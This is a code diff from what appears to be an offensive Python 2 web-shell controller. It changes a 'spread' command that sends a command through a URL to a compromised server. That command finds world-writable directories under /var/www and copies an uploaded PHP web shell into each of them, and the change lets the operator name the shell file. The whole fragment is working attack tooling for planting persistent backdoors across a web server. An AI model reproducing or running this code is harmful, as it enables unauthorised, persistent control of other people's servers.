@@ -123,9 +123,10 @@ class Commander(object):
                             print '{0:2d}- {1}'.format(c, path)
                             c += 1
                     elif command == 'spread':
-                        self.cmd = quote('find /var/www -xdev -type d \( -perm -0002 -a ! -perm -1000 \) | xargs -n 1 cp shell.php')
+                        shell_name = raw_input('\n[!] What\'s The name of the uploaded shell {}[ie. shell.php]{}? '.format(Colors.RED, Colors.END))
+                        self.cmd = quote('find /var/www -xdev -type d \( -perm -0002 -a ! -perm -1000 \) | xargs -n 1 cp {}'.format(shell_name))
                         urlopen('{}{}'.format(self.url, self.cmd))
-                        print '[+] Successfully wrote shell.php to {} directory\n[+] Type writeable to check dirs'.format(len(self.writeables))
+                        print '[+] Successfully wrote {0} to some writable paths\n[+] Type writeable to check dirs'.format(shell_name)
                     else:
                         source = urlopen('{}{}'.format(self.url, command)).read()
                         if source:
